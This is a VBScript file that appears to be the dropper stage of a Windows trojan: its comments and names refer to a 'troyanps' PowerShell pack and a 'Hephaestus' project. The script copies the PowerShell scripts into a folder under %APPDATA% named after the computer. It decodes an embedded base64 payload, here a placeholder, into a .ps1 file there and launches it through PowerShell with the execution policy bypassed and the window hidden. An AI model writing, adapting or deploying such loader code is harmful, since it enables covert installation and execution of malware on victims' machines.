Dim bodyX, bodyPs1Path, fso
Set fso = CreateObject("Scripting.FileSystemObject")
bodyX="0102"

' Copy _output\troyanps next to this .vbs into the Hephaestus folder so . ./utils.ps1 etc. resolve (debug / linked build).
Sub CopyTroyanPsPack(dstFolder)
    Dim srcFolder, file
    srcFolder = fso.BuildPath(fso.GetParentFolderName(WScript.ScriptFullName), "troyanps")
    If Not fso.FolderExists(srcFolder) Then Exit Sub
    If Not fso.FolderExists(dstFolder) Then fso.CreateFolder dstFolder
    For Each file In fso.GetFolder(srcFolder).Files
        If LCase(fso.GetExtensionName(file.Name)) = "ps1" Then
            fso.CopyFile file.Path, fso.BuildPath(dstFolder, file.Name), True
        End If
    Next
End Sub

' Same path as Get-BodyPath in troyanps/utils.ps1: %APPDATA%\<sanitized COMPUTERNAME>\<same>_b.ps1 (Get-MachineCode unchanged for registry/tracker).
Function SanitizeHephaestusDirName(raw)
    Dim i, ch, c, out, L
    out = ""
    L = Len(raw)
    For i = 1 To L
        ch = Mid(raw, i, 1)
        c = Asc(ch)
        If (c >= 48 And c <= 57) Or (c >= 65 And c <= 90) Or (c >= 97 And c <= 122) Or ch = "-" Or ch = "_" Then
            out = out & ch
        Else
            out = out & "_"
        End If
    Next
    Do While Len(out) > 0 And (Left(out, 1) = "_" Or Right(out, 1) = "_")
        If Left(out, 1) = "_" Then out = Mid(out, 2)
        If Len(out) > 0 And Right(out, 1) = "_" Then out = Left(out, Len(out) - 1)
    Loop
    If Len(out) = 0 Then out = "Hephaestus"
    If Len(out) > 32 Then out = Left(out, 32)
    SanitizeHephaestusDirName = out
End Function

Function GetHephaestusDirName()
    Dim sh, raw
    Set sh = CreateObject("WScript.Shell")
    raw = Trim(sh.ExpandEnvironmentStrings("%COMPUTERNAME%"))
    If Len(raw) = 0 Then
        GetHephaestusDirName = "Hephaestus"
    Else
        GetHephaestusDirName = SanitizeHephaestusDirName(raw)
    End If
End Function

Function GetBodyPs1Path()
    Dim fso, sh, appd, dname, folderPath, p
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set sh = CreateObject("WScript.Shell")
    appd = sh.ExpandEnvironmentStrings("%APPDATA%")
    dname = GetHephaestusDirName()
    folderPath = fso.BuildPath(appd, dname)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder folderPath
    End If
    p = fso.BuildPath(folderPath, dname & "_b.ps1")
    GetBodyPs1Path = p
End Function

bodyPs1Path = GetBodyPs1Path()
EnsureParentFolderExists bodyPs1Path
CopyTroyanPsPack fso.GetParentFolderName(bodyPs1Path)
DecodeBase64ToFile bodyX, bodyPs1Path

Sub Run()
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim command
    shell.CurrentDirectory = fso.GetParentFolderName(bodyPs1Path)
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & bodyPs1Path & """"
    shell.Run command, 0, True
End Sub

Call Run

Sub EnsureParentFolderExists(filePath)
    Dim fso, parent
    Set fso = CreateObject("Scripting.FileSystemObject")
    parent = fso.GetParentFolderName(filePath)
    If Len(parent) > 0 And Not fso.FolderExists(parent) Then
        fso.CreateFolder parent
    End If
End Sub

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    stream.SaveToFile outputFilePath, 2
    stream.Close
    
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function
